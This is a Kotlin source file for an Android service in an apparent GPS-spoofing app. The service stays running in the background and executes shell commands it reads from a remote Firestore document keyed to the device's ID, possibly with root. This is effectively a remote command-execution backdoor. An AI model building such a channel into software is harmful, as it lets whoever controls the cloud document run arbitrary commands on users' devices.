package com.hamham.gpsmover.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.hamham.gpsmover.R
import com.hamham.gpsmover.modules.CollectionsManager
import com.hamham.gpsmover.modules.RootManager
import com.hamham.gpsmover.modules.RootCommandResult
import android.Manifest
import android.os.PowerManager
import android.content.IntentFilter
import android.net.ConnectivityManager

/**
 * Background service for executing shell commands even when app is not in foreground
 * This service runs continuously and monitors Firebase for shell command requests
 */
class ShellCommandService : Service() {
    
    companion object {
        private const val TAG = "ShellCommandService"
        private const val NOTIFICATION_ID = 1001
        private const val NOTIFICATION_CHANNEL_ID = "shell_command_channel"
        private const val NOTIFICATION_CHANNEL_NAME = "Shell Command Service"
        
        /**
         * Start the shell command service
         */
        fun startService(context: Context) {
            Log.i(TAG, "🚀 Starting ShellCommandService")
            val intent = Intent(context, ShellCommandService::class.java)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        /**
         * Stop the shell command service
         */
        fun stopService(context: Context) {
            Log.i(TAG, "🛑 Stopping ShellCommandService")
            val intent = Intent(context, ShellCommandService::class.java)
            context.stopService(intent)
        }
        
        /**
         * Check if service is running
         */
        fun isServiceRunning(context: Context): Boolean {
            val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
                if (ShellCommandService::class.java.name == service.service.className) {
                    return true
                }
            }
            return false
        }
    }
    
    private var firestore: FirebaseFirestore? = null
    private var shellCommandListener: ListenerRegistration? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var connectivityReceiver: ConnectivityReceiver? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "📱 ShellCommandService created")
        
        // Initialize Firebase
        firestore = FirebaseFirestore.getInstance()
        
        // Create notification channel for Android 8.0+
        createNotificationChannel()
        
        // Request battery optimization exemption
        requestBatteryOptimizationExemption()
        
        // Acquire wake lock to keep CPU awake
        acquireWakeLock()
        
        // Register connectivity receiver to handle network changes
        registerConnectivityReceiver()
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification())
        
        // Start monitoring shell commands
        startShellCommandMonitoring()
        
        Log.i(TAG, "✅ ShellCommandService started successfully")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "🔄 ShellCommandService onStartCommand called")
        
        // Ensure monitoring is active
        if (shellCommandListener == null) {
            startShellCommandMonitoring()
        }
        
        // Return START_STICKY to automatically restart if killed
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null // This is a started service, not a bound service
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "🔥 ShellCommandService destroyed")
        
        // Clean up resources
        stopShellCommandMonitoring()
        releaseWakeLock()
        unregisterConnectivityReceiver()
        
        // Stop foreground
        stopForeground(true)
    }
    
    /**
     * Create notification channel for Android 8.0+
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitors and executes shell commands in the background"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
            
            Log.i(TAG, "📢 Notification channel created")
        }
    }
    
    /**
     * Create persistent notification for foreground service
     */
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("GPS Mover - Shell Command Monitor")
            .setContentText("Monitoring for shell commands in background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()
    }
    
    /**
     * Request battery optimization exemption to prevent Android from killing the service
     */
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                val packageName = packageName
                
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    Log.w(TAG, "⚠️ App is not exempt from battery optimization")
                    // Note: In a real app, you would request exemption from user
                    // For now, we just log the warning
                } else {
                    Log.i(TAG, "✅ App is exempt from battery optimization")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error checking battery optimization", e)
            }
        }
    }
    
    /**
     * Acquire wake lock to keep CPU active
     */
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG:ShellCommandWakeLock"
            ).apply {
                acquire(10*60*1000L /*10 minutes*/)
                Log.i(TAG, "🔋 Wake lock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error acquiring wake lock", e)
        }
    }
    
    /**
     * Release wake lock
     */
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.i(TAG, "🔋 Wake lock released")
                }
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error releasing wake lock", e)
        }
    }
    
    /**
     * Register connectivity receiver to handle network changes
     */
    private fun registerConnectivityReceiver() {
        try {
            connectivityReceiver = ConnectivityReceiver()
            val filter = IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
            registerReceiver(connectivityReceiver, filter)
            Log.i(TAG, "📡 Connectivity receiver registered")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error registering connectivity receiver", e)
        }
    }
    
    /**
     * Unregister connectivity receiver
     */
    private fun unregisterConnectivityReceiver() {
        try {
            connectivityReceiver?.let {
                unregisterReceiver(it)
                connectivityReceiver = null
                Log.i(TAG, "📡 Connectivity receiver unregistered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error unregistering connectivity receiver", e)
        }
    }
    
    /**
     * Start monitoring shell commands from Firebase
     */
    private fun startShellCommandMonitoring() {
        // Check required permissions first
        if (!checkRequiredPermissions()) {
            Log.e(TAG, "❌ Required permissions not granted, cannot start monitoring")
            return
        }
        
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        if (androidId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Android ID not available, cannot start monitoring")
            return
        }
        
        // Remove existing listener if any
        shellCommandListener?.remove()
        
        Log.i(TAG, "🎧 Starting shell command monitoring for device: $androidId")
        
        shellCommandListener = firestore?.collection("devices")?.document(androidId)
            ?.addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "❌ Error in shell command listener", error)
                    
                    // Try to restart listener after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        startShellCommandMonitoring()
                    }, 5000) // Retry after 5 seconds
                    
                    return@addSnapshotListener
                }
                
                Log.d(TAG, "📋 Background service - Snapshot listener triggered")
                
                if (snapshot != null && snapshot.exists()) {
                    val shellData = snapshot.get("shell") as? Map<String, Any>
                    Log.d(TAG, "📋 Background service - Shell data: $shellData")
                    
                    if (shellData != null) {
                        val shouldRun = shellData["run"] as? Boolean ?: false
                        val command = shellData["command"] as? String ?: ""
                        val count = (shellData["count"] as? Number)?.toInt() ?: 1
                        val waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                        
                        Log.d(TAG, "📋 Background service - Run: $shouldRun, Command: '$command'")
                        
                        // Only execute if run is true and command is not empty
                        if (shouldRun && command.isNotEmpty()) {
                            Log.i(TAG, "🔔 Background service executing shell command: '$command'")
                            
                            // Use CollectionsManager to execute the command
                            // This ensures consistency with the main app execution logic
                            CollectionsManager.executeShellCommandInBackground(
                                this@ShellCommandService, 
                                command, 
                                count, 
                                waitSeconds, 
                                androidId
                            )
                        } else if (!shouldRun) {
                            Log.d(TAG, "📋 Background service - Shell execution flag is false")
                        } else if (command.isEmpty()) {
                            Log.d(TAG, "📋 Background service - Shell command is empty")
                        }
                    }
                } else {
                    Log.d(TAG, "📋 Background service - Device document does not exist")
                }
            }
        
        Log.i(TAG, "✅ Shell command monitoring started in background service")
    }
    
    /**
     * Stop monitoring shell commands
     */
    private fun stopShellCommandMonitoring() {
        shellCommandListener?.remove()
        shellCommandListener = null
        Log.i(TAG, "🛑 Shell command monitoring stopped")
    }
    
    /**
     * Check if all required permissions are granted
     */
    private fun checkRequiredPermissions(): Boolean {
        val requiredPermissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
        )
        
        // Add background location permission for Android 10+
        val backgroundPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            emptyArray()
        }
        
        val allPermissions = requiredPermissions + backgroundPermissions
        
        for (permission in allPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "⚠️ Permission not granted: $permission")
                return false
            }
        }
        
        Log.i(TAG, "✅ All required permissions granted")
        return true
    }
    
    /**
     * Connectivity receiver to handle network changes
     */
    private inner class ConnectivityReceiver : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d(TAG, "📡 Network connectivity changed")
            
            // Check if Firebase connection is still active
            firestore?.let { fs ->
                // Try to reconnect monitoring if connection was lost
                if (shellCommandListener == null) {
                    Log.i(TAG, "🔄 Restarting shell command monitoring after network change")
                    startShellCommandMonitoring()
                }
            }
        }
    }
}
